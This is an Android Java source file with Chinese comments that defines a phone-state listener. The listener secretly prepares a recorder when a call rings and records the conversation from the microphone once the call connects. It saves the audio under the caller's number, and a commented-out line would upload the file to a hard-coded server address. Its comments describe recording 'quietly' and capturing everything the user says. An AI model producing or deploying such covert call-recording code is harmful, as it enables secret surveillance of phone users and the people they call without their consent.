package com.xtwy.mobilemedia;

import android.media.MediaRecorder;
import android.os.Environment;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.File;
import java.io.IOException;

/**
 * 创建时间： 2018/3/17.
 * 作    者： 侯建军
 * 功能描述：手机监听器
 */
public class PhoneListener extends PhoneStateListener implements MediaRecorder.OnInfoListener, MediaRecorder.OnErrorListener {
    private String number;  //电话号码
    //定义一个电话录音机
    private MediaRecorder mediaRecorder;
    private String TAG = "PhoneListener";
    private boolean isRecord;

    //当手机呼叫状态变化的时候 执行下面代码。
    //state 电话的状态
    //incomingnumber 来电号码
    @Override
    public void onCallStateChanged(int state, String incomingNumber) {
        try {
            //判断我们当前手机的通话状态
            switch (state) {
                //手机处于空闲状态，没有人打电话 没有零响
                case TelephonyManager.CALL_STATE_IDLE:
                    Log.i(TAG, "手机处于空闲状态，检查刚才是否开启了录音机，如果开启了，保存音频到sd卡");
                    if (mediaRecorder != null && isRecord) {
                        //8.停止录音
                        mediaRecorder.stop();
                        //9.释放资源。
                        mediaRecorder.release();
                        //方便垃圾回收器回收掉资源
                        mediaRecorder = null;
                        //上传音频文件到服务器 。 网络请求api。删除sd卡临时保存的文件。
                        //上传文件到服务器
                        // SocketClientUtil.uploadFile(file, "192.168.0.103", 7878);
                        isRecord = false;
                    }
                    break;
                //手机零响状态
                case TelephonyManager.CALL_STATE_RINGING:
                    Log.i(TAG, "手机铃声响的状态，悄悄地开启一个录音机，准备录音。");
                    //1.创建一个多媒体录音机的实例
                    mediaRecorder = new MediaRecorder();
                    //2.设定音频文件保存目录与名称,Environment.getExternalStorageDirectory()
                    // 默认：storage\sdcard\
                    number = incomingNumber;
                    String recordTitle = number + "_" + String.valueOf(System.currentTimeMillis());
                    File fileDir = new File(Environment.getExternalStorageDirectory() + File.separator + "mobile");
                    if (!fileDir.exists()) {
                        fileDir.mkdirs();
                    }
                    File file = new File(fileDir.getAbsolutePath(), recordTitle + ".amr");
                    //3.重置录音
                    mediaRecorder.reset();
                    //4.指定录音机的音频源 录音的音源是麦克风,录本地
                    mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                    //采样率
                    //mediaRecorder.setAudioEncodingBitRate(96000);
                    //上下行通话，双向录音，国产手机可用，国外有可能不生效
                    //mediaRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
                    //6.指定这个音频文件的格式 。
                    mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);

                    //7.设置音频的编码格式
                    mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
//                   mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
//                   mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);

                    //8.设置输出文件路径
                    mediaRecorder.setOutputFile(file.getAbsolutePath());
                    mediaRecorder.setOnInfoListener(this);
                    mediaRecorder.setOnErrorListener(this);
                    try {
                        //9.准备开始录音
                        mediaRecorder.prepare();
                    } catch (IOException e) {
                        Log.e(TAG, "录音失败：recorder.prepare()\n");
                        mediaRecorder = null;
                        return;
                    }
                    break;
                //电话接通状态，用户正在打电话
                case TelephonyManager.CALL_STATE_OFFHOOK:
                    Log.i(TAG, "手机处于通话状态，开始录音，把用户说的话都给录下来。");
                    if (mediaRecorder != null) {
                        //7.开始录音
                        //调用MediaRecorder的start方法开启通话过程的录音
                        mediaRecorder.start();
                        isRecord = true;
                    }
                    break;
            }
            //调用父类方法
            super.onCallStateChanged(state, incomingNumber);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onError(MediaRecorder mr, int what, int extra) {
        Log.e(TAG, "录音服务取得了MediaRecorder的onError回调what:" + what + " extra: " + extra);
        isRecord = false;
        mr.release();
    }

    @Override
    public void onInfo(MediaRecorder mr, int what, int extra) {
        Log.i(TAG, "录音服务取得了 MediaRecorder的onInfo回调what: " + what + " extra: " + extra);
        isRecord = false;
    }

}
